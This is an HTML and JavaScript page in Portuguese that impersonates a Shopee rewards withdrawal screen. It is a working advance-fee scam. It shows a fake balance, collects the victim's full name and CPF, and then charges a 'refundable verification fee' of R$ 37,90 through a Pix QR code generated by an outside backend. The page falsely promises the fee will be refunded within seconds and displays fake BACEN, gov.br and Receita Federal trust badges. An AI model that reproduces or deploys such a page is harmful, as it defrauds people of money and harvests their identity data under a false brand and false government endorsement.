<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Resgate Shopee</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --orange: #ee4d2d;
            --gray-bg: #f5f5f5;
            --text-dark: #222;
        }

        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Roboto', sans-serif;
            background: #e5e5e5;
            margin: 0;
            display: flex;
            justify-content: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .app-container {
            width: 100%;
            max-width: 480px;
            background: #fdfdfd;
            min-height: 100vh;
            position: relative;
            overflow: hidden; /* Importante para o efeito de blur */
            display: flex;
            flex-direction: column;
        }

        /* --- ETAPA 1: DASHBOARD (Fundo) --- */
        .header {
            padding: 20px;
            text-align: center;
            font-weight: 700;
            font-size: 18px;
        }

        .balance-card {
            background: var(--orange);
            margin: 10px 15px;
            border-radius: 12px;
            padding: 20px;
            color: white;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.3);
        }
        
        .coin-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 40px;
            color: rgba(255,255,255,0.2);
            border: 2px solid rgba(255,255,255,0.4);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .withdraw-section {
            padding: 20px;
        }
        
        .section-title {
            font-weight: 700;
            font-size: 16px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .grid-options {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }

        .option-card {
            background: #f0f0f0;
            border-radius: 8px;
            padding: 15px 5px;
            text-align: center;
            font-weight: 700;
            font-size: 14px;
            color: #333;
            border: 1px solid transparent;
        }

        .big-option {
            background: #f0f0f0;
            border-radius: 8px;
            padding: 25px;
            text-align: center;
            font-weight: 800;
            font-size: 24px;
            color: #333;
            cursor: pointer;
            transition: 0.2s;
            border: 2px solid transparent;
        }
        
        .big-option:active {
            transform: scale(0.98);
            border-color: var(--orange);
            background: #fff5f1;
        }

        .footer-banner {
            margin: 20px;
            background: white;
            border: 1px solid #eee;
            border-radius: 12px;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }

        /* --- MÁSCARA DE OFUSCAMENTO (BLUR) --- */
        .overlay-blur {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.4);
            backdrop-filter: blur(4px);
            z-index: 90;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.4s ease;
        }
        .overlay-blur.active {
            opacity: 1;
            pointer-events: all;
        }

        /* --- ETAPA 2 & 3: MODAL SLIDE UP --- */
        .bottom-sheet {
            position: fixed;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%) translateY(110%); /* Começa escondido */
            width: 100%;
            max-width: 480px;
            background: white;
            border-top-left-radius: 20px;
            border-top-right-radius: 20px;
            padding: 25px;
            box-shadow: 0 -5px 25px rgba(0,0,0,0.15);
            z-index: 100;
            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
        }
        
        .bottom-sheet.active {
            transform: translateX(-50%) translateY(0);
        }

        /* ESTILOS DA ETAPA 2 (INPUTS) */
        .sheet-header {
            text-align: center;
            font-weight: 700;
            font-size: 18px;
            margin-bottom: 25px;
        }

        .input-group { margin-bottom: 20px; }
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #333;
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            background: #f9f9f9;
        }
        .input-group input:focus {
            border-color: var(--orange);
            background: white;
        }

        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
            opacity: 0.7;
        }
        .trust-img { height: 25px; object-fit: contain; }

        .btn-action {
            width: 100%;
            padding: 16px;
            background: var(--orange);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
        }

        /* ESTILOS DA ETAPA 3 (CONFIRMAÇÃO) */
        .confirm-box {
            background: #fff;
            padding: 0;
        }
        
        .price-highlight {
            font-size: 36px;
            font-weight: 800;
            color: var(--orange);
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .tag-reembolso {
            background: #e0f7fa;
            color: #006064;
            font-size: 10px;
            padding: 4px 8px;
            border-radius: 4px;
            font-weight: 700;
            text-transform: uppercase;
        }

        .info-text {
            font-size: 13px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 20px;
        }

        .review-data {
            border-top: 1px dashed #ddd;
            border-bottom: 1px dashed #ddd;
            padding: 15px 0;
            margin-bottom: 20px;
        }
        
        .data-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            font-size: 14px;
        }
        .data-label { color: #888; }
        .data-val { font-weight: 600; text-align: right; }

        /* MODAL QR CODE (FINAL) */
        #qr-screen {
            display: none;
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: white;
            z-index: 200;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

    </style>
</head>
<body>

    <div class="app-container">
        
        <div id="stage-1">
            <div class="header">Resgatar recompensas</div>
            
            <div class="balance-card">
                <div style="font-size: 14px; margin-bottom: 5px;">Seu saldo</div>
                <div style="font-size: 32px; font-weight: 800;">R$ 1.489,38</div>
                <div style="font-size: 12px; opacity: 0.9; margin-top: 5px;">= 42.583,05 pontos (s)</div>
                <div style="margin-top: 15px; font-size: 11px; border-top: 1px dashed rgba(255,255,255,0.3); padding-top: 10px;">
                    Última bonificação apresentada: R$ 845,24
                </div>
                <div class="coin-icon">$</div>
            </div>

            <div class="withdraw-section">
                <div class="section-title">Sacar dinheiro</div>
                <div style="font-size: 13px; color: #888; margin-bottom: 10px;">Transferência via Pix</div>

                <div class="grid-options">
                    <div class="option-card">R$1,5</div>
                    <div class="option-card">R$5</div>
                    <div class="option-card">R$10</div>
                </div>

                <div class="big-option" onclick="abrirEtapa2()">
                    R$ 1.489,38
                </div>
                <div style="text-align: center; color: #ccc; font-size: 12px; margin-top: 5px;">Toque para sacar tudo</div>

                <p style="font-size: 11px; color: #999; text-align: center; margin-top: 20px; line-height: 1.4;">
                    Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque podem variar.
                </p>
            </div>

            <div class="footer-banner">
                <div style="flex:1;">
                    <div style="font-weight: 700; font-size: 14px;">Obtenha seu acesso exclusivo</div>
                    <div style="font-size: 11px; color: #666; margin-top: 5px;">Descubra todos os benefícios liberados especialmente para você.</div>
                </div>
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/2560px-Shopee.svg.png" style="width: 40px;">
            </div>
        </div>

        <div class="overlay-blur" id="overlay"></div>

        <div class="bottom-sheet" id="stage-2">
            <div class="sheet-header">Vincular PIX</div>

            <div class="input-group">
                <label>Nome Completo</label>
                <input type="text" id="input-nome" placeholder="Digite seu nome completo">
            </div>

            <div class="input-group">
                <label>Tipo de Chave PIX</label>
                <select id="input-tipo">
                    <option value="cpf">CPF</option>
                    <option value="celular">Celular</option>
                    <option value="email">E-mail</option>
                </select>
            </div>

            <div class="input-group">
                <label>Chave PIX (CPF)</label>
                <input type="tel" id="input-chave" placeholder="Digite sua chave aqui" maxlength="14" oninput="formatarCPF(this)">
            </div>

            <div style="text-align: center; color: #00bfa5; font-size: 12px; margin: 15px 0; font-weight: 500; display: flex; align-items: center; justify-content: center; gap: 5px;">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="#00bfa5"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                Reembolso automático em 1 minuto
            </div>

            <div class="trust-badges">
                <div style="font-weight:bold; color:#005da3;">BACEN</div>
                <div style="font-weight:bold; color:#00a000;">gov.br</div>
                <div style="font-weight:bold; color:#222;">Receita Federal</div>
            </div>

            <button class="btn-action" onclick="irParaEtapa3()">CONTINUAR</button>
            <div style="text-align: center; color: #ccc; font-size: 11px; margin-top: 10px;">Processo 100% seguro</div>
        </div>

        <div class="bottom-sheet" id="stage-3">
            <div style="font-size: 12px; color: #888; font-weight: 700; margin-bottom: 5px;">CONFIRMAÇÃO DE IDENTIDADE</div>
            
            <div class="price-highlight">
                R$ 37,90 
                <span class="tag-reembolso">VALOR REEMBOLSÁVEL</span>
            </div>

            <p class="info-text">
                Taxa de verificação obrigatória para liberação do saldo de <b>R$ 1.489,38</b>. O valor de R$ 37,90 será estornado automaticamente para sua conta em <b>8 segundos</b> após a validação.
            </p>

            <div class="review-data">
                <div style="font-size: 11px; color: #888; font-weight: 700; margin-bottom: 10px;">DADOS PARA O PIX</div>
                <div class="data-row">
                    <span class="data-label">Nome</span>
                    <span class="data-val" id="review-nome">--</span>
                </div>
                <div class="data-row">
                    <span class="data-label">Chave PIX</span>
                    <span class="data-val" id="review-chave">--</span>
                </div>
                <div class="data-row" style="margin-top: 15px; align-items: center;">
                    <span class="data-label">Valor a receber</span>
                    <span class="data-val" style="color: var(--orange); font-size: 18px;">R$ 1.489,38</span>
                </div>
            </div>

            <button class="btn-action" id="btn-final" onclick="gerarPixReal()">PAGAR R$ 37,90 E SACAR</button>
        </div>

        <div id="qr-screen">
            <h3 style="color:#333;">Pagamento via Pix</h3>
            <p style="font-size:14px; text-align:center; color:#555;">Pague e receba seu saldo + estorno em 8s.</p>
            <img id="qr-image" style="width: 220px; margin: 20px 0; border:1px solid #eee;">
            <div id="pix-copia" style="font-size:11px; color:#777; background:#f0f0f0; padding:10px; border-radius:5px; word-break:break-all; margin-bottom:20px;"></div>
            <button class="btn-action" onclick="copiarCodigo()">COPIAR CÓDIGO</button>
            <div id="msg-sucesso" style="margin-top:20px; color:green; font-weight:bold; display:none;">✅ PAGAMENTO CONFIRMADO!</div>
        </div>

    </div>

    <script>
        const API_URL = "https://checkout-pix-profissional.onrender.com";

        // --- CONTROLE DAS ETAPAS ---

        function abrirEtapa2() {
            // Ativa o blur no fundo
            document.getElementById('overlay').classList.add('active');
            // Sobe a Etapa 2
            document.getElementById('stage-2').classList.add('active');
        }

        function irParaEtapa3() {
            const nome = document.getElementById('input-nome').value;
            const chave = document.getElementById('input-chave').value;

            if(nome.length < 3 || chave.length < 5) {
                alert("Por favor, preencha seus dados corretamente.");
                return;
            }

            // Preenche os dados na Etapa 3 (Automaticamente)
            document.getElementById('review-nome').innerText = nome;
            document.getElementById('review-chave').innerText = chave;

            // Fecha Etapa 2 e Abre Etapa 3
            document.getElementById('stage-2').classList.remove('active');
            
            // Pequeno delay para transição suave
            setTimeout(() => {
                document.getElementById('stage-3').classList.add('active');
            }, 200);
        }

        function formatarCPF(i) {
            let v = i.value.replace(/\D/g,"");
            v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4");
            i.value = v;
        }

        // --- INTEGRAÇÃO COM SEU BACKEND ---

        async function gerarPixReal() {
            const nome = document.getElementById('input-nome').value;
            const cpf = document.getElementById('input-chave').value.replace(/\D/g,''); // Limpa CPF
            const btn = document.getElementById('btn-final');

            btn.innerText = "GERANDO...";
            btn.disabled = true;

            try {
                // Chama a API que já criamos
                const res = await fetch(`${API_URL}/pix`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        amount: 37.90, // Valor da taxa
                        name: nome,
                        cpf: cpf
                    })
                });
                
                const data = await res.json();

                if (data.point_of_interaction) {
                    const qr = data.point_of_interaction.transaction_data;
                    
                    // Mostra tela de QR Code
                    document.getElementById('stage-3').classList.remove('active');
                    document.getElementById('overlay').classList.remove('active'); // Remove blur
                    
                    const telaQr = document.getElementById('qr-screen');
                    telaQr.style.display = 'flex';
                    
                    document.getElementById('qr-image').src = `data:image/png;base64,${qr.qr_code_base64}`;
                    document.getElementById('pix-copia').innerText = qr.qr_code;

                    monitorar(data.id);
                }
            } catch (e) {
                alert("Erro ao conectar. Tente novamente.");
                btn.innerText = "TENTAR NOVAMENTE";
                btn.disabled = false;
            }
        }

        function monitorar(id) {
            setInterval(async () => {
                try {
                    const r = await fetch(`${API_URL}/pix/${id}`);
                    const j = await r.json();
                    if(j.status === 'approved' || j.status === 'refunded') {
                        document.getElementById('msg-sucesso').style.display = 'block';
                        document.getElementById('qr-image').style.opacity = 0.3;
                    }
                } catch(e){}
            }, 3000);
        }

        function copiarCodigo() {
            navigator.clipboard.writeText(document.getElementById('pix-copia').innerText);
            alert("Código copiado!");
        }
    </script>
</body>
</html>